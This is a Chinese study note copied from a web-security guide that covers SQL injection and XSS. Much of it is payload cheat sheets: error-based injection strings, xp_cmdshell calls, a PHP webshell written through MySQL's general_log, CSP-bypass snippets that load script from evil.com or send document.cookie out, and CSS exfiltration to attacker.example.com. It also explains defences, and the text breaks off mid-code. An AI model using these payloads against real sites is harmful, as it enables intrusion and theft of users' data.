来源：https://websec.readthedocs.io/zh/latest/vuln/index.html

本文仅作为自己参考使用。

# 1.SQL注入

sqli-labs见其它博客：

**1.1 注入分类**

**简介**

SQL 注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的 SQL 语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。  

**按技巧分类**

根据使用的技巧， SQL 注入类型可分为
	• 盲注
    	– 布尔盲注：只能从应用返回中推断语句执行后的布尔值
		– 时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断
	• 报错注入：应用会显示全部或者部分的报错信息
	• 堆叠注入：有的应用可以加入 ; 后一次执行多条语句
	• 其他  

**按获取数据的方式分类**

另外也可以根据获取数据的方式分为 3 类
1.inband
利用 Web 应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。
2.inference
通过 Web 的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注，通过 web 应用的其他改变来推断
数据。
3.out of band (OOB2)
通过其他传输方式来获得数据，比如 DNS 解析协议和电子邮件。  

**1.2 注入检测**

**常见的注入点**

​	• GET/POST/PUT/DELETE 参数
​	• X-Forwarded-For
​	• 文件名  

**Fuzz注入点**

• ' / "

• 1/1

• 1/0

• and 1=1

• " and "1"="1

• and 1=2

• or 1=1

• or 1=

• ' and '1'='1  

• + - ^ * % /

• << >> || | & &&

• ~

• !

• @

• 反引号执行  

**测试用常量**

• @@version

• @@servername

• @@language

• @@spid  

**测试列数**

例如 http://www.foo.com/index.asp?id=12+union+select+null,null-- ，不断增加 null 至不返回  

**报错注入**

• select 1/0
• select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a
• extractvalue(1, concat(0x5c,(select user())))
• updatexml(0x3a,concat(1,(select user())),1)
• exp(~(SELECT * from(select user())a))
• ST_LatFromGeoHash((select * from(select * from(select user())a)b))
• GTID_SUBSET(version(), 1)  

**基于 geometric 的报错注入  **

• GeometryCollection((select * from (select * from(select user())a)b))

• polygon((select * from(select * from(select user())a)b))

• multipoint((select * from(select * from(select user())a)b))

• multilinestring((select * from(select * from(select user())a)b))  

• LINESTRING((select * from(select * from(select user())a)b))

• multipolygon((select * from(select * from(select user())a)b))

其中需要注意的是，基于 exp 函数的报错注入在 MySQL 5.5.49 后的版本已经不再生效，具体可以参考这个`commit 95825f `。

而以上列表中基于 geometric 的报错注入在这个 `commit 5caea4` 中被修复，在 5.5.x 较后的版本中同样不再生效。  

**堆叠注入**

• ;select 1  

**注释符**

• #
• --+
• /*xxx*/
• /*!xxx*/
• /*!50000xxx*/

**判断过滤规则**

• 是否有 trunc

• 是否过滤某个字符

• 是否过滤关键字

• slash 和编码  

**获取信息**

• 判断数据库类型
	– and exists (select * from msysobjects ) > 0 access 数据库
	– and exists (select * from sysobjects ) > 0 SQLServer 数据库
• 判断数据库表
	– and exsits (select * from admin)
• 版本、主机名、用户名、库名
• 表和字段  

​	– 确定字段数

​		\* Order By
​		\* Select Into
– 表名、列名  

**测试权限**

• 文件操作
	– 读敏感文件
	– 写 shell
• 带外通道
	– 网络请求  

**1.3 权限提升**

**UDF提权**

UDF（User Defned Function，用户自定义函数）是 MySQL 提供的一个功能，可以通过编写 DLL 扩展为MySQL 添加新函数，扩充其功能。
当获得 MySQL 权限之后，即可通过这种方式上传自定义的扩展文件，从 MySQL 中执行系统命令。  

详见：https://blog.csdn.net/qq_44159028/article/details/121193134

**1.4 数据库检测**

**MySQL**

• sleep sleep(1)
• benchmark BENCHMARK(5000000, MD5('test'))
• 字符串连接
	– SELECT 'a' 'b'
	– SELECT CONCAT('some','string')
• version
	– SELECT @@version
	– SELECT version()
• 识别用函数
	– connection_id()  

​	– last_insert_id()
​	– row_count()  

**Oracle**

• 字符串连接
	– 'a'||'oracle' --
	– SELECT CONCAT('some','string')
• version
	– SELECT banner FROM v$version
	– SELECT banner FROM v$version WHERE rownum=1  

**SQLServer**

• WAITFOR WAITFOR DELAY '00:00:10';
• SERVERNAME SELECT @@SERVERNAME
• version SELECT @@version
• 字符串连接
	– SELECT 'some'+'string'
• 常量
	– @@pack_received
	– @@rowcount  

**PostgreSQL**

• sleep pg_sleep(1)  

**1.5 绕过技巧**

• 编码绕过
	– 大小写
	– url 编码
	– html 编码
	– 十六进制编码  

​	– unicode 编码
• 注释
​	– `// -- -- + -- - # /**/ ;%00`
​	– `内联注释用的更多，它有一个特性 /!**/ 只有 MySQL 能识别`
​	–` e.g. index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3`
• 只过滤了一次时
​	– union => ununionion
• 相同功能替换
​	– 函数替换
​		\* substring / mid / sub
​		\* ascii / hex / bin
​		\* benchmark / sleep
​	– 变量替换
​		\* user() / @@user
​	– 符号和关键字
​		\* and / &
​		\* or / |
• HTTP 参数
​	– HTTP 参数污染
​		\* id=1&id=2&id=3 根据容器不同会有不同的结果
​	– HTTP 分割注入
• 缓冲区溢出
​	– 一些 C 语言的 WAF 处理的字符串长度有限，超出某个长度后的 payload 可能不会被处理
• 二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过  

**1.6 SQL注入小技巧**

**宽字节注入**

一般程序员用 gbk 编码做开发的时候，会用 set names 'gbk' 来设定，这句话等同于  

```
set
character_set_connection = 'gbk',
character_set_result = 'gbk',
character_set_client = 'gbk';
```

漏洞发生的原因是执行了 set character_set_client = 'gbk'; 之后， mysql 就会认为客户端传过来的数据是 gbk 编码的，从而使用 gbk 去解码，而 mysql_real_escape 是在解码前执行的。但是直接用 set names 'gbk' 的话 real_escape 是不知道设置的数据的编码的，就会加 %5c 。此时 server 拿到数据解码就认为提交的字符 +%5c 是 gbk 的一个字符，这样就产生漏洞了。
解决的办法有三种，第一种是把 client 的 charset 设置为 binary，就不会做一次解码的操作。第二种是是mysql_set_charset('gbk') ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。第三种就是用 pdo。
还有一些其他的编码技巧，比如 latin 会弃掉无效的 unicode，那么 admin%32 在代码里面不等于 admin，在数据库比较会等于 admin。  

**二次注入**

二次 SQL 注入（Second-Order SQL Injection）是一种特殊类型的 SQL 注入攻击。与一般的 SQL 注入攻击类似，攻击者会通过输入恶意的 SQL 语句来执行非法操作。而二次 SQL 注入则是指攻击者在应用程序中注入恶意的数据，然后等待应用程序将这些数据存储在数据库中。当应用程序再次从数据库中读取这些数据时，恶意数据就会被读取出来，并执行恶意操作。
例如，一个 web 应用程序可能会将用户输入的内容存储在数据库中，然后在后续的页面中将这些内容显示出来。如果攻击者在用户输入中注入了恶意 SQL 语句，那么这些语句会被存储在数据库中。当应用程序从数据库中读取这些内容并在后续的逻辑中使用时，恶意 SQL 语句就有可能被执行，从而导致攻击成功。
与一般的 SQL 注入攻击相比，二次 SQL 注入攻击更加难以防范和检测，因为攻击者并不直接向应用程序发送恶意 SQL 语句，而是将其存储在数据库中等待应用程序读取。因此，防止二次 SQL 注入攻击需要采取一些特殊的防御措施，例如对输入数据进行更加严格的过滤和转义处理，使用预编译等。  

**1.7 CheatSheet**

**（1）SQL Server 常见Payload**

```
• Version
	– SELECT @@version
	– SELECT SERVERPROPERTY('Edition');
	– SELECT SERVERPROPERTY('EngineEdition');
• Comment
	– SELECT 1 -- comment
	– SELECT /*comment*/1
• Space
	– 0x01 - 0x20
• 用户信息
	– SELECT user_name()
	– SELECT system_user
	– SELECT user
	– SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID
• 用户权限
	– select IS_SRVROLEMEMBER('sysadmin')
	– select IS_SRVROLEMEMBER('db_owner')
• List User
	– SELECT name FROM master..syslogins
• 数据库信息
	– SELECT name FROM master..sysdatabases
	– select concat_ws(table_schema,table_name,column_name) from information_schema.columns
	– select quotename(name) from master..sysdatabases FOR XML PATH('')
• 执行命令
	– EXEC xp_cmdshell 'net user'
• Ascii
	– SELECT char(0x41)
	– SELECT ascii('A')
	– SELECT char(65)+char(66) => return AB
• Delay
	– WAITFOR DELAY '0:0:3' pause for 3 seconds
• Change Password
	– ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'
• Trick
	– id=1 union:select password from:user
• 文件读取
	– OpenRowset
• 当前查询语句
	– select text from sys.dm_exec_requests cross apply sys.
dm_exec_sql_text(sql_handle)
• hostname
	– 用于判断是否站库分离
	– select host_name()
	– exec xp_getnetname
• 服务器信息
	– exec xp_msver
• 系统配置
	– select * from sys.configurations;
```

**注册表读写**

```
• xp_regread
	– exec xp_regread N'HKEY_LOCAL_MACHINE', N'SYSTEM\CurrentControlSet\Services\MSSEARCH'
• xp_regwrite
• xp_regdeletvalue
• xp_regdeletkey
• xp_regaddmultistring
```

**报错注入**

• 1=convert(int,(db_name()))  

**常用函数**

```
• SUSER_NAME()
• USER_NAME()
• PERMISSIONS()
• DB_NAME()
• FILE_NAME()
• TYPE_NAME()
• COL_NAME()
```

**DNS OOB**

```
• fn_xe_fle_target_read_fle
• fn_get_audit_fle
• fn_trace_gettable
```

**其它常用存储过程**

```
• sp_execute_external_script
• sp_makewebtask
• sp_OACreate
• sp_OADestroy
• sp_OAGetErrorInfo
• sp_OAGetProperty
• sp_OAMethod
• sp_OASetProperty
• sp_OAStop
• xp_cmdshell
• xp_dirtree
• xp_enumerrorlogs
• xp_enumgroups
• xp_fxeddrives
• xp_getfledetails
• xp_loginconfg
```

**（2）MySQL常见Payload**

```
• Version
	– SELECT @@version
• Comment
	– SELECT 1 -- comment
	– SELECT 1 # comment
	– SELECT /*comment*/1
• Space
	– 0x9 0xa-0xd 0x20 0xa0
• Current User
	– SELECT user()
	– SELECT system_user()
	– SELECT current_role()
• List User
	– SELECT user FROM mysql.user
• Current Database
	– SELECT database()
• List Database
	– SELECT schema_name FROM information_schema.schemata
• List Tables
	– SELECT table_schema,table_name FROM information_schema.tables WHERE
table_schema != 'mysql' AND table_schema != 'information_schema'
• List Columns
	– SELECT table_schema, table_name, column_name FROM information_schema.columns
WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
• If
	– SELECT if(1=1,'foo','bar'); return ’foo’
• Ascii
	– SELECT char(0x41)
	– SELECT ascii('A')
	– SELECT 0x414243 => return ABC
• Delay
	– sleep(1)
	– SELECT BENCHMARK(1000000,MD5('A'))
• Read File
	– select @@datadir
	– select load_file('databasename/tablename.MYD')
• Blind
	– ascii(substring(str,pos,length)) & 32 = 1
• Error Based
	– select count(*),(floor(rand(0)*2))x from information_schema.tables group by
x;
	– select count(*) from (select 1 union select null union select !1)x group
by concat((select table_name from information_schema.tables limit 1),
floor(rand(0)*2))
• Change Password
	– mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('newpassword')
WHERE user='root';FLUSH PRIVILEGES;"
```

**报错注入常见函数**

```
• extractvalue
• updatexml
• GeometryCollection
• linestring
• multilinestring
• multipoint
• multipolygon
• polygon
• exp
```

**写文件**

1.写文件前提

• root 权限
• 知晓文件绝对路径
• 写入的路径存在写入权限
• secure_fle_priv 允许向对应位置写入
• select count(file_priv) from mysql.user  

2.基于info写文件

```
union select 1,1,1 into outfile '/tmp/demo.txt'
union select 1,1,1 into dumpfile '/tmp/demo.txt'
```

dumpfle 和 outfle 不同在于， outfle 会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏  

3.基于log写文件

```
show variables like '%general%';
set global general_log = on;
set global general_log_file = '/path/to/file';
select '<?php var_dump("test");?>';
set global general_log_file = '/original/path';
set global general_log = off;
```

**PostgresSQL Payload  和Oracle Payload SQLite3暂略**

**NoSQL常见Payload**

```
• 绕过限制条件
	– {"username": "user"} => {"username": {"ne": "fakeuser"}}
	– {"$where": "return true"}
• 测试用字符
	– '"\/$[].>
• 布尔测试常用
	– {"$ne": -1}
	– {"$in": []}
	– {"$where": "return true"}
	– {"$or": [{},{"foo":"1"}]}
• 时间
	– {"$where": "sleep(100)"}		
```

**1.8 预编译**

**简介**

SQL 注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的 SQL引擎进行解析为 AST 或 Opcode，第二次交互发送数据，代入 AST 或 Opcode 中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。

**模拟预编译**

为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。  

**绕过**

1.预编译使用错误

预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。  

2.部分参数不可预编译

在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。  

3.预编译实现错误

部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。  

# 2.XSS

xss-lab见其它博客。

**2.1 分类**

**简介**

XSS 全称为 Cross Site Scripting，为了和 CSS 分开简写为 XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的 JavaScript 代码执行。 XSS 通常被用于获取 Cookie、以受攻击者的身份进行操作等行为。  

**反射型XSS**

反射型 XSS 是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句：` <?php
echo "<p>hello, $_GET['user']</p>";?> `，那么在访问时设置 `/?user=</p><script>alert("hack")</script><p>` ，则可执行预设好的 JavaScript 代码。
反射型 XSS 通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到 XSS Auditor、 NoScript 等防御手段的影响较大。  

**储存型XSS**

储存型 XSS 相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。

**DOM XSS**

DOM 型 XSS 不同之处在于 DOM 型 XSS 一般和服务器的解析响应没有直接关系，而是在 JavaScript 脚本动态执行的过程中产生的。  

例如

```html
<html>
<head>
<title>DOM Based XSS Demo</title>
<script>
function xsstest()
{
var str = document.getElementById("input").value;
document.getElementById("output").innerHTML = "<img src='"+str+"'></img>";
} 
</script>
</head>
<body>
<div id="output"></div>
<input type="text" id="input" size=50 value="" />
<input type="button" value="submit" onclick="xsstest()" />
</body>
</html>
```

输入` x' onerror='javascript:alert(/xss/) `即可触发。  

**Blind XSS**

Blind XSS 是储存型 XSS 的一种，它保存在某些存储中，当一个“受害者”访问这个页面时执行，并且在文
档对象模型 (DOM) 中呈现 payload。它被称为 Blind 的原因是因为它通常发生在通常不暴露给用户的功能上。  

**2.2 危害**

存在 XSS 漏洞时，可能会导致以下几种情况：
 	1. 用户的 Cookie 被获取，其中可能存在 Session ID 等敏感信息。若服务器端没有做相应防护，攻击者可用对应 Cookie 登陆服务器。
 	2. 攻击者能够在一定限度内记录用户的键盘输入。
 	3. 攻击者通过 CSRF 等方式以用户身份执行危险操作。
 	4. XSS 蠕虫。
 	5. 获取用户浏览器信息。  
 	6. 利用 XSS 漏洞扫描用户内网。  

**2.3 同源策略**

**简介**

同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。是否同源由 URL决定， URL 由协议、域名、端口和路径组成，如果两个 URL 的协议、域名和端口相同，则表示他们同源。  

**file域的同源策略**

在之前的浏览器中，任意两个 file 域的 URI 被认为是同源的。本地磁盘上的任何 HTML 文件都可以读取本地磁盘上的任何其他文件。
从 Gecko 1.9 开始，文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。  

**cookie 的同源策略  **

cookie 使用不同的源定义方式，一个页面可以为本域和任何父域设置 cookie，只要是父域不是公共后缀
(public sufx) 即可。
不管使用哪个协议 (HTTP/HTTPS) 或端口号，浏览器都允许给定的域以及其任何子域名访问 cookie。设置cookie 时，可以使用 domain / path / secure 和 http-only 标记来限定其访问性。
所以 https://localhost:8080/ 和 http://localhost:8081/ 的 Cookie 是共享的。  

**Flash/SilverLight 跨域  **

浏览器的各种插件也存在跨域需求。通常是通过在服务器配置 crossdomain.xml，设置本服务允许哪些域名的跨域访问。
客户端会请求此文件，如果发现自己的域名在访问列表里，就发起真正的请求，否则不发送请求。  

**源的更改  **

同源策略认为域和子域属于不同的域，例如 child1.a.com 与 a.com / child1.a.com 与 child2.a.com /
xxx.child1.a.com 与 child1.a.com 两两不同源。
对于这种情况，可以在两个方面各自设置 document.domain='a.com' 来改变其源来实现以上任意两个页面之间的通信。
另外因为浏览器单独保存端口号，这种赋值会导致端口号被重写为 null 。  

**跨源访问**

同源策略控制了不同源之间的交互，这些交互通常分为三类：
• 通常允许跨域写操作 (Cross-origin writes)
	– 链接 (links)
	– 重定向
	– 表单提交
• 通常允许跨域资源嵌入 (Cross-origin embedding)
• 通常不允许跨域读操作 (Cross-origin reads)
可能嵌入跨源的资源的一些示例有：

```
• <script src="..."></script> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。
• <link rel="stylesheet" href="..."> 标签嵌入 CSS。由于 CSS 的松散的语法规则， CSS 的跨域
需要一个设置正确的 Content-Type 消息头。
• <img> / <video> / <audio> 嵌入多媒体资源。
• <object> <embed> 和 <applet> 的插件。
• @font-face 引入的字体。一些浏览器允许跨域字体 ( cross-origin fonts)，一些需要同源字体 (sameorigin fonts)。
• <frame> 和 <iframe> 载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨
域交互。
```

**JSONP 跨域  **

JSONP 就是利用` <script>` 标签的跨域能力实现跨域数据的访问，请求动态生成的 JavaScript 脚本同时带一个 callback 函数名作为参数。

服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用 callback 函数。

JSONP 也存在一些安全问题，例如当对传入/传回参数没有做校验就直接执行返回的时候，会造成 XSS问
题。没有做 Referer 或 Token 校验就给出数据的时候，可能会造成数据泄露。

另外 JSONP 在没有设置 callback 函数的白名单情况下，可以合法的做一些设计之外的函数调用，引入问题。这种攻击也被称为 SOME 攻击。  

**跨源脚本 API 访问  **

Javascript 的 APIs 中，如 iframe.contentWindow , window.parent, window.open 和 window.opener 允许文档间相互引用。当两个文档的源不同时，这些引用方式将对 window 和 location 对象的访问添加限制。
window 允许跨源访问的方法有  

• window.blur
• window.close
• window.focus
• window.postMessage
window 允许跨源访问的属性有
• window.closed
• window.frames
• window.length
• window.location
• window.opener
• window.parent
• window.self
• window.top
• window.window
其中 window.location 允许读/写，其他的属性只允许读  

**跨源数据存储访问**

存储在浏览器中的数据，如 localStorage 和 IndexedDB，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的 Javascript 脚本不能对属于其它源的数据进行读写操作  。

**CORS**

CORS 是一个 W3C 标准，全称是跨域资源共享 (Cross-origin resource sharing)。通过这个标准，可以允许浏览器读取跨域的资源。

**常见请求头**

```
• Origin
	– 预检请求或实际请求的源站 URI, 浏览器请求默认会发送该字段
	– Origin: <origin>
• Access-Control-Request-Method
	– 声明请求使用的方法
	– Access-Control-Request-Method: <method>
• Access-Control-Request-Headers
	– 声明请求使用的 header 字段
	– Access-Control-Request-Headers: <field-name>[, <field-name>]*
```

**常见返回头**  

```
• Access-Control-Allow-Origin
	– 声明允许访问的源外域 URI
	– 对于携带身份凭证的请求不可使用通配符 *
	– Access-Control-Allow-Origin: <origin> | *
• Access-Control-Expose-Headers
	– 声明允许暴露的头
	– e.g. Access-Control-Expose-Headers: X-My-Custom-Header,
X-Another-Custom-Header
• Access-Control-Max-Age
	– 声明 Cache 时间
	– Access-Control-Max-Age: <delta-seconds>
• Access-Control-Allow-Credentials
	– 声明是否允许在请求中带入
	– Access-Control-Allow-Credentials: true
• Access-Control-Allow-Methods
	– 声明允许的访问方式
	– Access-Control-Allow-Methods: <method>[, <method>]*
• Access-Control-Allow-Headers
	– 声明允许的头
	– Access-Control-Allow-Headers: <field-name>[, <field-name>]*
```

**防御建议**

• 如非必要不开启 CORS

• 定义详细的白名单，不使用通配符，仅配置所需要的头

• 配置 Vary: Origin 头部  

• 如非必要不使用 Access-Control-Allow-Credentials

• 限制缓存的时间  

**阻止跨源访问**

阻止跨域写操作，可以检测请求中的 CSRF token ，这个标记被称为 Cross-Site Request Forgery (CSRF) 标记。
阻止资源的跨站读取，因为嵌入资源通常会暴露信息，需要保证资源是不可嵌入的。但是多数情况下浏览器都不会遵守 Content-Type 消息头。例如如果在 HTML 文档中指定` <script>` 标记，则浏览器会尝试将HTML 解析为 JavaScript。  

**2.4 CSP**

Content Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。  

**配置**

CSP 策略可以通过 HTTP 头信息或者 meta 元素定义。
CSP 有三类：
• Content-Security-Policy (Google Chrome)
• X-Content-Security-Policy (Firefox)
• X-WebKit-CSP (WebKit-based browsers, e.g. Safari)  

```
HTTP header :
"Content-Security-Policy:" 策略
"Content-Security-Policy-Report-Only:" 策略
```

HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而 Content-Security-Policy-ReportOnly 则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。
HTML Meta :  

```
<meta http-equiv="content-security-policy" content="策略">
<meta http-equiv="content-security-policy-report-only" content="策略">
```

**指令说明**

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240404141844.png)

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240404141904.png)

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20240404141915.png)

**配置范例**

允许执行内联 JS 代码，但不允许加载外部资源  

Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';  

**Bypass**

1.预加载

浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为 DNS-prefetch、 subresource、 prefetch、 preconnect、 prerender。  

HTML5 页面预加载是用 link 标签的 rel 属性来指定的。如果 csp 头有 unsafe-inline，则用预加载的方式可以向外界发出请求，例如：

```
<!-- 预加载某个页面 -->
<link rel='prefetch' href='http://xxxx'><!-- firefox -->
<link rel='prerender' href='http://xxxx'><!-- chrome -->
<!-- 预加载某个图片 -->
<link rel='prefetch' href='http://xxxx/x.jpg'>
<!-- DNS 预解析 -->
<link rel="dns-prefetch" href="http://xxxx">
<!-- 特定文件类型预加载 -->
<link rel='preload' href='//xxxxx/xx.js'><!-- chrome -->
```

另外，不是所有的页面都能够被预加载，当资源类型如下时，将阻止预加载操作：
	• URL 中包含下载资源
	• 页面中包含音频、视频
	• POST、 PUT 和 DELET 操作的 ajax 请求
	• HTTP 认证
	• HTTPS 页面
	• 含恶意软件的页面
	• 弹窗页面
	• 占用资源很多的页面
	• 打开了 chrome developer tools 开发工具  

**MIME Sniﬀ**

举例来说， csp 禁止跨站读取脚本，但是可以跨站读 img，那么传一个含有脚本的 img，再 `<script href='http://xxx.com/xx.jpg'>`，这里 csp 认为是一个 img，绕过了检查，如果网站没有回正确的 mime type，浏览器会进行猜测，就可能加载该 img 作为脚本  

**302跳转**

对于 302 跳转绕过 CSP 而言，实际上有以下几点限制：
	• 跳板必须在允许的域内。
	• 要加载的文件的 host 部分必须跟允许的域的 host 部分一致  

**iframe**

当可以执行代码时，可以创建一个源为 css js 等静态文件的 frame，在配置不当时，该 frame 并不存在 csp，则在该 frame 下再次创建 frame，达到 bypass 的目的。同理，使用 ../../../ /%2e%2e%2f 等可能触发服务器报错的链接也可以到达相应的目的  

**base-uri**

当 script-src 为 nonce 或无限制，且 base-uri 无限制时，可通过 base 标签修改根 URL 来 bypass，如下加载了 http://evil.com/main.js  

```
<base href="http://evil.com/">
<script nonce="correct value" src="/main.js"></script>
```

**其它**

• location 绕过
• 可上传 SVG 时，通过恶意 SVG 绕过同源站点
• 存在 CRLF 漏洞且可控点在 CSP 上方时，可以注入 HTTP 响应中影响 CSP 解析
• CND Bypass，如果网站信任了某个 CDN, 那么可利用相应 CDN 的静态资源 bypass
• Angular versions <1.5.9 >=1.5.0，存在漏洞 Git Pull Request
• jQuery sourcemap  

```
document.write(`<script>
//@ sourceMappingURL=http://xxxx/`+document.cookie+`<\/script>`);``
```

• a 标签的 ping 属性
• For FireFox	` <META HTTP-EQUIV="refresh" CONTENT="0; url=data:text/html;base64,
PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=">`
•` <link rel="import" />`
• `<meta http-equiv="refresh" content="0; url=http://...." />`
• 仅限制 script-src 时：
	–` <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>  `

**2.5 XSS数据源**

**URL**
• location
• location.href
• location.pathname
• location.search
• location.hash
• document.URL
• document.documentURI
• document.baseURI
**Navigation**
• window.name
• document.referrer
**Communication**
• Ajax
• Fetch
• WebSocket
• PostMessage
**Storage**
• Cookie
• LocalStorage
• SessionStorage  

**2.6 Sink**

**执行JavaScript**

• eval(payload)  

• setTimeout(payload, 100)
• setInterval(payload, 100)
• Function(payload)()
• `<script>payload</script>`
• `<img src=x onerror=payload>  `

**加载URL**

• location=javascript:alert(/xss/)
• location.href=javascript:alert(/xss/)
• location.assign(javascript:alert(/xss/))
• location.replace(javascript:alert(/xss/))  

**执行HTML**

• xx.innerHTML=payload
• xx.outerHTML=payload
• document.write(payload)
• document.writeln(payload)  

**2.7 XSS保护**

**HTML过滤**

使用一些白名单或者黑名单来过滤用户输入的 HTML，以实现过滤的效果。例如 DOMPurify 等工具都是用该方式实现了 XSS 的保护。  

**X-Frame**

X-Frame-Options 响应头有三个可选的值：
• DENY
	– 页面不能被嵌入到任何 iframe 或 frame 中
• SAMEORIGIN
	– 页面只能被本站页面嵌入到 iframe 或者 frame 中
• ALLOW-FROM  

​	– 页面允许 frame 或 frame 加载  

**XSS保护头**

基于 Webkit 内核的浏览器 (比如 Chrome) 在特定版本范围内有一个名为 XSS auditor 的防护机制，如果浏览器检测到了含有恶意代码的输入被呈现在 HTML 文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来。
而浏览器是否要拦截这段恶意代码取决于浏览器的 XSS 防护设置。
要设置浏览器的防护机制，则可使用 X-XSS-Protection 字段该字段有三个可选的值
• 0 : 表示关闭浏览器的 XSS 防护机制
• 1 : 删除检测到的恶意代码，如果响应报文中没有看到 X-XSS-Protection 字段，那么浏览器就认为
X-XSS-Protection 配置为 1，这是浏览器的默认设置
• 1; mode=block : 如果检测到恶意代码，在不渲染恶意代码
FireFox 没有相关的保护机制，如果需要保护，可使用 NoScript 等相关插件。  

**WAF Bypass**

• 利用 <> 标记
• 利用 html 属性
	– href
	– lowsrc
	– bgsound
	– background
	– value
	– action
	– dynsrc
• 关键字
	– 利用回车拆分
	– 字符串拼接
		\* window["al" + "ert"]
• 利用编码绕过
	– base64
	– jsfuck  

​	– String.fromCharCode
​	– HTML
​	– URL
​	– hex
​		\* window["\x61\x6c\x65\x72\x74"]
​	– unicode
​	– utf7
​		\* +ADw-script+AD4-alert('XSS')+ADsAPA-/script+AD4-
​	– utf16
• 大小写混淆
• 对标签属性值转码
• 产生事件
• css 跨站解析
• 长度限制 bypass
​	– eval(name)
​	– eval(hash)
​	– import
​	– $.getScript
​	– $.get
• .
​	– 使用 。 绕过 IP/域名
​	– document['cookie'] 绕过属性取值
• 过滤引号用 ‘‘ ‘ ‘‘ 绕过  

**2.9 技巧**

**httponly**

• 在 cookie 为 httponly 的情况下，可以通过 xss 直接在源站完成操作，不直接获取 cookie。
• 在有登录操作的情况下，部分站点直接发送登录请求可能会带有 cookie
• 部分特定版本的浏览器可能会在 httponly 支持/处理上存在问题
• 低版本浏览器支持 TRACE / TRACK，可获取敏感的 header 字段  

• phpinfo 等页面可能会回显信息，这些信息中包含 http 头
• 通过 xss 劫持页面钓鱼
• 通过 xss 伪造 oauth 等授权请求，远程登录  

**CSS注入**

CSS 注入最早开始于利用 CSS 中的 expression() url() regex() 等函数或特性来引入外部的恶意代码，但
是随着浏览器的发展，这种方式被逐渐禁用，与此同时，出现了一些新的攻击方式。  

**CSS selectors  **

```
<style>
#form2 input[value^='a'] { background-image: url(http://localhost/log.php/a); }
#form2 input[value^='b'] { background-image: url(http://localhost/log.php/b); }
#form2 input[value^='c'] { background-image: url(http://localhost/log.php/c); }
[...]
</style>
<form action="http://example.com" id="form2">
<input type="text" id="secret" name="secret" value="abc">
</form>
```

上图是利用 CSS selectors 完成攻击的一个示例  

**Abusing Unicode Range  **

当可以插入 CSS 的时候，可以使用 font-face 配合 unicode-range 获取目标网页对应字符集。 PoC 如下  

```
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>
<p id="sensitive-information">AB</p>
```

当字符较多时，则可以结合 ::first-line 等 CSS 属性缩小范围，以获取更精确的内容  

**Bypass Via Script Gadgets  **

一些网站会使用白名单或者一些基于 DOM 的防御方式，对这些方式，有一种被称为 Code Reuse 的攻
击方式可以绕过。该方式和二进制攻防中的 Gadget 相似，使用目标中的合法代码来达到绕过防御措施的目的。在论文 Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via
Script Gadgets 中有该方法的具体描述。
portswigger 的 一 篇 博 文 也 表 达 了 类 似 的 想 法 https://portswigger.net/blog/
abusing-javascript-frameworks-to-bypass-xss-mitigations。
下面有一个简单的例子，这个例子使用了 DOMPurify 来加固，但是因为引入了 jquery.mobile.js 导致可
以被攻击。  

**例子**

```
// index.php
<?php
$msg = $_GET['message'];
$msg = str_replace("\n", "", $msg);
$msg = base64_encode($msg);
